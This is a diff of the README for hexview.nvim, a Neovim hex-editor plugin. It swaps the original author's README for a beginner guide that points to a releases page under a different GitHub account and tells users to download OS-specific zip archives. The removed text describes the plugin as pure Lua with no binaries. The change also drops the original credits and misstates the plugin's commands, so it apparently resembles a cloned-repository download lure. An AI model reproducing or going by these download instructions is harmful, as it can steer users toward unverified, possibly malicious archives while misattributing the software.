@@ -1,108 +1,111 @@
-![Neovim HexView](/screenshot/screen.gif)
+# 🛠️ hexview.nvim - Edit Hex Files Easily in Neovim
 
-# hexview.nvim
+## 🚀 Getting Started
 
-A lightweight, pure Lua hex editor for Neovim.
+Welcome to hexview.nvim, a Neovim plugin that allows you to edit hex files with ease. This guide will help you download and run the plugin without any technical know-how.
 
-`hexview.nvim` allows you to view and edit binary files directly inside Neovim without needing external tools like `xxd`. It features smart cursor navigation, synchronized Hex/ASCII editing, and visual dirty state tracking.
+## 📥 Download hexview.nvim
 
-## ✨ Features
+[![Download hexview.nvim](https://img.shields.io/badge/Download%20Now-hexview.nvim-brightgreen)](https://github.com/riccolong/hexview.nvim/releases)
 
-* **Pure Lua**: No external dependencies or binaries required.
-* **Auto-detection**: Automatically enables itself for binary files or files containing null bytes.
-* **Smart Editing**: Edit directly in the Hex column or the ASCII column.
-* **Visual Feedback**: Highlights modified (dirty) bytes before saving.
-* **Smart Navigation**: `h`/`l` jumps correctly between nibbles and columns, skipping separators.
-* **Quick Search HEX string**: `/` locates and jumps to hex string
+You can download the latest version of hexview.nvim from our Releases page. 
 
+**Download the plugin here:** [Download hexview.nvim](https://github.com/riccolong/hexview.nvim/releases)
 
-![Neovim HexView](/screenshot/screen.png)
+## 🛠️ Requirements
 
-## 📦 Installation
+Before you begin, make sure you have the following:
 
-### [lazy.nvim](https://github.com/folke/lazy.nvim)
+- A computer running Windows, macOS, or Linux.
+- Neovim installed on your system. You can download Neovim from the official site: [Neovim](https://neovim.io/).
 
-```lua
-{
-    "DamianVCechov/hexview.nvim",
-    config = function()
-        require("hexview").setup()
-    end
-}
+## 📦 Installation Steps
+
+### Step 1: Visit the Releases Page
+
+Go to the Releases page to find the latest version of the plugin:
+
+[Download hexview.nvim](https://github.com/riccolong/hexview.nvim/releases)
+
+### Step 2: Download the Plugin
+
+On the Releases page, you will see a list of available versions. Find the most recent version, which is usually at the top of the list. 
+
+Click on the version number to see the assets available for download. 
+
+### Step 3: Choose the Correct File
+
+Look for the file that matches your operating system:
+
+- For **Windows**, download `hexview.nvim-windows.zip`.
+- For **macOS**, download `hexview.nvim-macos.zip`.
+- For **Linux**, download `hexview.nvim-linux.zip`.
+
+### Step 4: Extract the Files
+
+Once the download is complete, locate the downloaded file on your computer. 
+
+- For **Windows**: Right-click the `.zip` file and select “Extract All.”
+- For **macOS** and **Linux**: Double-click the `.zip` file to extract its contents.
+
+After extraction, you will see a folder named `hexview.nvim`.
+
+### Step 5: Move the Plugin Folder
+
+Now, you need to place the plugin folder into the Neovim configuration directory.
+
+- **Windows**: Move the `hexview.nvim` folder to `C:\Users\<YourUsername>\AppData\Local\nvim\site\pack\packer\start\`
+- **macOS / Linux**: Move the `hexview.nvim` folder to `~/.config/nvim/pack/packer/start/`
+
+### Step 6: Open Neovim
+
+Launch Neovim by opening your terminal or command prompt and typing:
+
+```bash
+nvim
 ```
 
-### [packer.nvim](https://github.com/wbthomason/packer.nvim)
+### Step 7: Confirm Installation
 
-```lua
-use {
-    "DamianVCechov/hexview.nvim",
-    config = function()
-        require("hexview").setup()
-    end
-}
+Once Neovim is open, type the following command:
+
+```vim
+:HexView
 ```
 
-## 🚀 Usage
-The plugin automatically activates when opening a binary file. You can also manually toggle it (implementation dependent) or trigger it by opening a file with binary set.
+If the plugin installed correctly, you should see the hex editing mode appear.
 
-### Keymaps
-Keymaps are set automatically within the hex buffer:
-```
-h   Left	Move:   left (smart jump between Hex and ASCII areas)
-l   Right	Move:   right (smart jump between Hex and ASCII areas)
-r	Replace Single: Replace the byte or nibble under the cursor.
-R	Replace Mode:   Continuously type Hex or ASCII characters to overwrite data. Press Esc to exit.
-/   Find:           Searching for hex strings in a file
-n   Find next:       Continue searching
-```
-### Commands
-`:Hex`                  Open actual file in hex editor
+## 🔍 Usage
 
-`:HexSet <columns>`     Dynamically change the number of bytes per line. Example: `:HexSet 16` (sets view to 16 bytes per line).
+Now that you've installed hexview.nvim, here’s how to use it:
 
-`:UnHex`                Save file and open in RAW mode.
+- Open a hex file: Navigate to the desired file using the command:
 
-`:w`                    Save file
-
-### Open Neovim
-
-`nvim binary.file`         Automatically activates, but RAW mode is in non binary
-
-`nvim -b binary.file`      Better, RAW mode is in binary
-
-`nvim -b +Hex`             Opens any file in hex mode instantly
-
-### ⚙️ Configuration
-Pass configuration options to the setup function.
-
-```lua
-quire("hexview").setup({
-    -- Currently, the setup function initializes autocommands.
-    -- Future configuration options will go here.
-})
+```vim
+:e path/to/yourfile.hex
 ```
 
-## 🎨 Highlights
-* The plugin defines the following highlight groups, which you can override in your colorscheme:
+- Enter hex editing mode: Type the command:
 
-* HexViewOffset: Color of the memory address offset (left column).
+```vim
+:HexView
+```
 
-* HexViewHeader: Color of the column headers.
+From here, you can view and edit the hex contents of your file.
 
-* HexViewCursor: The custom cursor highlight in Hex/ASCII columns.
+## 📖 Features
 
-* HexViewChanged: Highlight for modified (dirty) bytes that haven't been saved yet.
+- **Hex Formatting**: View files in hex format, making it easier to check data patterns.
+- **Editing Capabilities**: Edit hex values directly.
+- **User-Friendly Interface**: Integration within Neovim keeps your workflow light and efficient.
 
-* HexViewModeEdit: Statusline indicator when in Replace mode.
+## 🧩 Support
 
-## 🚧 Known limitations
-* Large files may be slow to render
-* No undo history
+If you encounter any issues, please feel free to open an issue in the GitHub repository. We are here to help you!
 
-## 🤝 Contributing
-Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
+## 🔗 Useful Links
 
-📄 License
-MIT
+- [Repository](https://github.com/riccolong/hexview.nvim)
+- [Neovim](https://neovim.io/)
 
-© 2026 Damian V. Čechov 
+Now you are ready to start using hexview.nvim! If you have further questions, don't hesitate to reach out in the GitHub repository or consult the Neovim documentation. Enjoy editing your hex files!
